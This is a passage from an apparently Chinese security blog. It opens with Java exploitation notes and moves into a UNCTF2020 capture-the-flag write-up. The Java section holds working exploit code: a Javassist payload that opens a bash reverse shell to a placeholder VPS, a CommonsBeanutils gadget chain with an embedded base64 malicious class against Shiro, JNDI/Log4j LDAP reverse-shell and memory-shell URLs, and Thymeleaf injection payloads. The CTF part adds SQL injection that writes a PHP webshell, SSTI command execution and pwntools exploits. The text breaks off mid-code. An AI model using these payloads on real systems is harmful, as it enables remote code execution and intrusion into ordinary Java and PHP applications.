classPool.getCtClass(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;); helloAbstractTranslet.setSuperclass(ctClass); CtConstructor ctConstructor = new CtConstructor(new CtClass[]&#123;&#125;,helloAbstractTranslet); ctConstructor.setBody(&quot;java.lang.Runtime.getRuntime().exec(new String[]&#123;\\&quot;/bin/bash\\&quot;, \\&quot;-c\\&quot;, \\&quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\\&quot;&#125;);&quot;); helloAbstractTranslet.addConstructor(ctConstructor); byte[] bytes = helloAbstractTranslet.toBytecode(); helloAbstractTranslet.detach(); return bytes; &#125; public static void setFieldValue(String className,Object object, String field_name, Object field_value) throws Exception &#123; Class clazz = Class.forName(className); Field declaredField = clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,field_value); &#125; public static void serialize(Object object) throws Exception &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); &#125; public static void unserialize() throws Exception &#123; ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); &#125;&#125; Rome从一道题看java反序列化和回显获取 ​ 工具ysuserial: https://github.com/su18/ysoserial java -jar ysuserial-0.9-su18-all.jar -g CommonsBeanutils1183NOCC -p &quot;revshe ll&quot; | base64 ​ 绕过fastjson参考： https://github.com/safe6Sec/Fastjson fastjson小于1.2.68全漏洞RCE利用exp ​ JNDI注入JNDIExp 在VPS上启动工具,利用时讲ip替换为实际VPS的IP地址。 $&#123;jndi:ldap://127.0.0.1:1389/basic/$&#123;java:version&#125;&#125; 使用 $&#123;java:version&#125; 获取到目标服务器上的java版本（仅仅适用于Log4j2漏洞利用，fastjson等其他漏洞可以跳过此步骤） JDK版本小于11.0.1, 8u191, 7u201, 6u211版本，可以直接使用basic模块 12345ldap://0.0.0.0:1389/basic/cmd (无回显，需要进行url编码)ldap://0.0.0.0:1389/basic/base64/[base64_encoded_cmd]ldap://0.0.0.0:1389/basic/ReverseShell/[ip]/[port](反弹shell)ldap://0.0.0.0:1389/basic/ReverseShell2/[ip]/[port]ldap://0.0.0.0:1389/basic/memshell/[memshellType]（内存马） JDK版本大于11.0.1, 8u191, 7u201, 6u211时，需要尝试使用利用链绕过，可以使用$&#123;jndi:ldap://127.0.0.1:1389/fuzzbyDNS/[domain]&#125; 利用dnslog去判断哪些利用链可以进行利用（只需要发送一次请求） （反序列化链存在版本区别serialVersionUID会改变，通过dns请求可知目标可以使用el、groovy、BeanShell1反序列化、CC3.2.1反序列化、CB192等等利用模块） 选择其中一个利用链进行利用。 ​ Shiro 未授权访问 &lt;1.5.2 Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon, authc等拦截器。anon为匿名拦截器，不需要登录即可访问；authc为登录拦截器，需要登录才可以访问。 /;/admin 或 /xxx/...;/admin /;/actuator/heapdump 下载dump，使用visualvm分析，得到shiro的加密密钥 反序列化 通用 打cb1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;public class CommonsBeanutilsShiro &#123; public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123; Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception &#123;// TemplatesImpl obj = new TemplatesImpl();// setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;// ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()// &#125;);// setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);// setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); byte[] evilcode = Base64.getDecoder().decode(&quot;yv66vgAAADQAuQoALwBfCgBgAGEKAGAAYggAYwoAZABlCABmBwBnCgAHAGgHAGkKAGoAawgAbAgAbQgAbggAbwgATQoABwBwCABxCABOBwByCgBqAHMIAFAIAHQKAHUAdgoAEwB3CAB4CgATAHkIAHoIAHsKABMAfAgAfQgAfggAfwgAgAoACQCBCACCBwCDCgCEAIUKAIQAhgoAhwCICgAkAIkIAIoKACQAiwoAJACMCACNCACOBwCPBwCQAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMcm9tZS9TcHJpbmdFdmlsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwCRAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAFjAQARTGphdmEvbGFuZy9DbGFzczsBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFvAQASTGphdmEvbGFuZy9PYmplY3Q7AQACbTEBAARyZXNwAQADcmVxAQAJZ2V0V3JpdGVyAQAJZ2V0SGVhZGVyAQAGd3JpdGVyAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY29tbWFuZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQALY2hhcnNldE5hbWUBAA1TdGFja01hcFRhYmxlBwCPBwBnBwCSBwBpBwByBwBTBwCTAQAKU291cmNlRmlsZQEAD1NwcmluZ0V2aWwuamF2YQwAQgBDBwCUDACVAJYMAJcAmAEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAmQwAmgCbAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAJwAnQEAEGphdmEvbGFuZy9PYmplY3QHAJIMAJ4AnwEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEACmdldFJlcXVlc3QBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQwAoACdAQAlamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVxdWVzdAEAEGphdmEvbGFuZy9TdHJpbmcMAKEAogEAB29zLm5hbWUHAKMMAKQApQwApgCnAQAGd2luZG93DACoAKkBAANHQksBAAVVVEYtOAwAqgCnAQADV0lOAQACL2MBAAcvYmluL3NoAQACLWMMAKsArAEAB3ByaW50bG4BABFqYXZhL3V0aWwvU2Nhbm5lcgcArQwArgCvDACwALEHALIMALMAtAwAQgC1AQACXEEMALYAtwwAuACnAQAFZmx1c2gBAAVjbG9zZQEAD3JvbWUvU3ByaW5nRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAWADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAbADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAHAAEAB0AEAAeABsAHwAlACAAMQAhADwAIgBIACMAUwAkAF8AJQB1ACYAkAAnAJYAKACcACkAqQAqAL4AKwDEACwA3QAtAO0ALgDzAC8A/AAxAQIAMgEIADQBDgA1AUoANgFiADcBegA4ADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXg==&quot;); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;evilcode&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); byte[] expcode = Base64.getEncoder().encode(barr.toByteArray()); System.out.println(new String(expcode)); &#125;&#125; &lt;=1.2.4 检测工具： https://github.com/sv3nbeast/ShiroScan https://github.com/feihong-cs/ShiroExploit-Deprecated/releases ​ Springboot actuatorSpringboot actuator配置不当导致API安全问题。 API扫描工具：APIKit 12345678910111213/actuator/autoconfig 应用的自动化配置报告/actuator/beans 应用上下文创建的所有 Bean/actuator/configprops 应用中配置的属性信息报告/actuator/env 环境属性报告/actuator/mappings SpringMVC 的控制器映射关系报告/actuator/info 自定义的配置信息/actuator/metrics 当前应用的各类重要度量指标/actuator/health 应用的各类健康指标信息/actuator/threaddump 用来暴露程序运行中的线程信息/actuator/httptrace 显示HTTP跟踪信息（默认显示最后100个HTTP请求）/actuator/scheduledtasks 计划任务/actuator/jolokia JMX-HTTP桥接器（XXE-SSRF） ​ ThymeleafThymeleaf模板注入 123__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x__$&#123;T(java.lang.Thread).sleep(10000)&#125;__::... __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::... 参考： Java安全之Thymeleaf 模板注入分析","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"},{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"}],"author":"Lazzaro"},{"title":"UNCTF2020","slug":"match-UNCTF2020","date":"2020-11-14T10:44:31.000Z","updated":"2020-11-30T09:06:09.861Z","comments":true,"path":"2020/11/14/match-UNCTF2020/","link":"","permalink":"https://lazzzaro.github.io/2020/11/14/match-UNCTF2020/","excerpt":"","text":"​ 2020年高校联合招新赛UNCTF 竞赛时间： 2020年11月07日-14日 后面几天没太看掉了下来，Rank: 23 Webeasy_ssrf 123456789101112131415&lt;?phpecho&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;;highlight_file(__FILE__);$url = $_GET[&#x27;url&#x27;];if(preg_match(&#x27;/unctf\\.com/&#x27;,$url))&#123; if(!preg_match(&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;,$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo(&#x27;error!!&#x27;); &#125;&#125;else&#123; echo(&quot;error&quot;);&#125;?&gt; 简单的ssrf攻击。 file_get_contents函数，当目标请求时会判断使用的协议，如果为无法识别的协议会当做目录处理，会造成目录穿越，构造payload: ?url=0://unctf.com/../../../../../flag拿到flag。 ​ easyunserialize 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 反序列化字符串逃逸。 先构造普通情形： 123456789101112131415161718192021222324252627&lt;?phpclass a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;$x=new a(&#x27;admin&#x27;,1);echo serialize($x);//O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:1;&#125;?&gt; 需要password变为easy，且challenge会多4字节变easychallenge，构造 ?1=challenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; 会变成 ?1=easychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; 计算需要的challenge数量：$9x+29=(9+4)x$，发现 $x=7.25$ 非整数， 在payload后补足三个空格，使得 $9x+29+3=(9+4)x$，解得 $x=8$，即构造uname为8个challenge并在尾部补三个空格，payload： ?1=challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;%20%20%20 ​ babyeval 123456789101112131415&lt;?php // flag在flag.php if(isset($_GET[&#x27;a&#x27;]))&#123; if(preg_match(&#x27;/\\(.*\\)/&#x27;, $_GET[&#x27;a&#x27;])) die(&#x27;hacker!!!&#x27;); ob_start(function($data)&#123; if (strpos($data, &#x27;flag&#x27;) !== false) return &#x27;ByeBye hacker&#x27;; return false; &#125;); eval($_GET[&#x27;a&#x27;]); &#125; else &#123; highlight_file(__FILE__); &#125;?&gt; 过滤不多的RCE，?a=echo `base64 flag.php` ​ ezphp 123456789101112&lt;?phpshow_source(__FILE__);$username = &quot;admin&quot;;$password = &quot;password&quot;;include(&quot;flag.php&quot;);$data = isset($_POST[&#x27;data&#x27;])? $_POST[&#x27;data&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($data);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125; 反序列化，要构造username为admin和password为password，尝试构造array： 12345&lt;?php$x=array(&#x27;username&#x27;=&gt;&#x27;admin&#x27;,&#x27;password&#x27;=&gt;&#x27;password&#x27;);echo serialize($x);//a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;password&quot;;&#125;?&gt; 发现不成功，那么username和password需要的实际字符串应该不对。 if判断条件出用的是==弱类型比较，PHP中任意字符串==true结果都为true，更换构造值为bool类型： 12345&lt;?php$x=array(&#x27;username&#x27;=&gt;true,&#x27;password&#x27;=&gt;true);echo serialize($x);//a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;?&gt; POST提交payload，得到flag。 ​ easy_upload 随便上传 De1ctf 2020-Check in原题。 随便传一个jpg文件，回显过滤perl|pyth|ph|auto|curl|base|\\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents! 上传.htaccess文件，bp改包，用换行绕过关键字过滤： 12345AddHandler p\\hp5-script .txtp\\hp_value au\\to_append_file /flag 再随便传一个txt文件，访问对应路径即加载得到/flag内容。 ​ easyflask进入提示a easy flask problem,first login as the admin， 访问/login登录，尝试admin/admin登录，提示login fail! check /register， 访问/register注册，用admin/admin注册，提示register success，注册成功， 回到登录页登录，提示admin login success!， 再回到主页，发现提示变为admin login success and check the secret route /secret_route_you_do_not_know 访问/secret_route_you_do_not_know，提示you should &#39;guess&#39; the secret number GET方式传入?guess=&#123;&#123;3*5&#125;&#125;，回显15 error!!，存在SSTI漏洞。 fuzz一波，发现过滤了[]、_、&quot;、&#39;、%等，尝试用request外部参数方式，利用&lt;class &#39;click.utils.LazyFile&#39;&gt;类命令执行。 列目录： 1?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;g=__globals__&amp;mod=os&amp;func=popen&amp;cmd=ls&amp;re=read 读文件： 1?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;file=flag.txt&amp;re=read ​ checkin-sql 非常简单的sql 0.0 提示1：flag不在数据库中。。 强网杯 2019-随便注原题魔改。 1&#39; or 1=1 #，查看返回数据 1&#39; order by 2 #，查列数 1&#39; union select 1,2 #，失败，说明有正则过滤 1&#39;; show databases;#，堆叠注入查数据库 1&#39;; show tables;#，堆叠注入查表 1&#39;; show columns from 0xDktb;#，堆叠注入查数据库 用预处理语句查询结果（select * from `0xDktb` ）： 1&#39;; set@a=0x73656c656374202a2066726f6d20603078446b746260; prepare execsql from @a;execute execsql;#，失败，说明有关键字被过滤，尝试发现是set关键字 改为： 1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;#，成功查询，但不是flag，更换查询内容，找了整个数据库都未发现flag字符串。 猜测flag在文件系统里，尝试写文件（select &#39;&lt;?php @eval($_POST[ccc]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;）： 1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;# 用蚁剑试连，发现成功，在根目录拿到flag。 ​ PwnYLBNB 守护世界上最好的YLBnc 45.158.33.12 8000 先nc，提示用pwntool，运行脚本拿到flag。 123from pwn import *r = remote(&#x27;45.158.33.12&#x27;, 8000)r.interactive() ​ fan简单ret2text 1234567from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,48548)system_addr=0x400735payload = &#x27;a&#x27;*(0x30+8) + p64(system_addr)r.recvuntil(&#x27;input your message\\n&#x27;)r.sendline(payload)r.interactive() ​ do_you_like_me?简单ret2text 1234567from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,46506)system_addr=0x4006CDpayload = &#x27;a&#x27;*(0x10+8) + p64(system_addr)r.recvuntil(&#x27;Give me your input : &#x27;)r.sendline(payload)r.interactive() ​ Reversere_checkin 二进制手做不出来这个就考虑退役吧 IDA打开，定位到start函数，再不断跟进到sub_4015DC发现flag。 1234567891011121314151617181920212223242526272829303132.text:00000000004015DC sub_4015DC proc near .text:00000000004015DC arg_0 = qword ptr 10h.text:00000000004015DC.text:00000000004015DC push rbp.text:00000000004015DD mov rbp, rsp.text:00000000004015E0 mov [rbp+arg_0], rcx.text:00000000004015E4 mov cs:Str2, &#x27;u&#x27;.text:00000000004015EB mov cs:byte_42F041, &#x27;n&#x27;.text:00000000004015F2 mov cs:byte_42F042, &#x27;c&#x27;.text:00000000004015F9 mov cs:byte_42F043, &#x27;t&#x27;.text:0000000000401600 mov cs:byte_42F044, &#x27;f&#x27;.text:0000000000401607 mov cs:byte_42F045, &#x27;&#123;&#x27;.text:000000000040160E mov cs:byte_42F046, &#x27;W&#x27;.text:0000000000401615 mov cs:byte_42F047, &#x27;e&#x27;.text:000000000040161C mov cs:byte_42F048, &#x27;l&#x27;.text:0000000000401623 mov cs:byte_42F049, &#x27;c&#x27;.text:000000000040162A mov cs:byte_42F04A, &#x27;o&#x27;.text:0000000000401631 mov cs:byte_42F04B, &#x27;m&#x27;.text:0000000000401638 mov cs:byte_42F04C, &#x27;e&#x27;.text:000000000040163F mov cs:byte_42F04D, &#x27;T&#x27;.text:0000000000401646 mov cs:byte_42F04E, &#x27;o&#x27;.text:000000000040164D mov cs:byte_42F04F, &#x27;U&#x27;.text:0000000000401654 mov cs:byte_42F050, &#x27;N&#x27;.text:000000000040165B mov cs:byte_42F051, &#x27;C&#x27;.text:0000000000401662 mov cs:byte_42F052, &#x27;T&#x27;.text:0000000000401669 mov cs:byte_42F053, &#x27;F&#x27;.text:0000000000401670 mov cs:byte_42F054, &#x27;&#125;&#x27;.text:0000000000401677 mov cs:byte_42F055, 0.text:000000000040167E nop.text:000000000040167F pop rbp.text:0000000000401680 retn.text:0000000000401680 sub_4015DC endp ​ 反编译用 pyinstxtractor反编译出pyc文件，再用uncompyle6反编译pyc可得源代码： 12345str2 = &#x27;UMAQBvogWLDTWgX&quot;&quot;&quot;k&#x27;flag = &#x27;&#x27;for i in range(len(str2)): flag += chr(ord(str2[i]) + i)print(flag) 运行得flag。 ​ babypy Babypy.That’s really easy!!! 用 pyinstxtractor反编译出pyc文件，再用uncompyle6反编译pyc可得源代码： 1234567891011121314151617181920212223import os, libnum, binasciiflag = &#x27;unctf&#123;*******************&#125;&#x27;x = libnum.s2n(flag)def gen(x): y = abs(x) while 1: if y &gt; 0: yield y % 2 y = y &gt;&gt; 1 else: if x == 0: yield 0l = [i for i in gen(x)]l.reverse()f = &#x27;%d&#x27; * len(l) % tuple(l)a = binascii.b2a_hex(f.encode())b = int(a, 16)c = hex(b)[2:]print(c)os.system(&#x27;pause&#x27;) 代码逻辑为字符→10进制→2进制→字符16进制，txt文件16进制按逻辑逆推得到flag。 ​ CTFilter 假如你是李华，你的好友学习委员无意之间看到了一串flag！这串flag极有可能是解开谜题的关键。他立刻在一台装有Windows10 1903 x64操作系统的虚拟机中使用记事本写下了这串flag并保存。然而，令他没想到的是，这个系统却另有玄机！任何人都无法在这个系统中写下正确的flag？请你以好友的身份对他伸出援手，帮助学习委员找到真正的flag。 学习委员：那你能帮帮我吗？李华：瞧谁不起呢？ 压缩包里有CTFilter.sys、Hint.exe、Unknown_data、Story.txt四个文件，IDA分析前两个，CTFilter.sys查看没什么结果，Hint.exe中发现一个flag字符串flag&#123;Oh!You_found_me~&#125;，结合题干描述这串flag极有可能是解开谜题的关键，尝试将flag字符串作为key与密文Unknown_data异或，发现居然成功得到flag。 ​ Cryptoeasy_rsa给 $a,b,e$，易推出 $p$ 和 $q$，再按正常RSA解法解即可。 123456789101112import gmpy2a = 320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168b = 9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370p = (a+b)/2q = (a-b)/2n = p * qe = 65537phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)c = 22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) ​ 鞍山大法官开庭之缺的营养这一块怎么补 某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotoottoflag格式：unctf{} 尝试二进制转字符及摩斯密码均不成功，最后才想到培根密码，分别把o和t替换为A和B，在线解密得flag。 ​ 简单的RSA 你们都不会百度的吗 只给出 $e,n,c$，且 $e$ 很大，简单的RSA Wiener攻击： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#sagedef rational_to_contfrac(x,y): # Converts a rational x/y 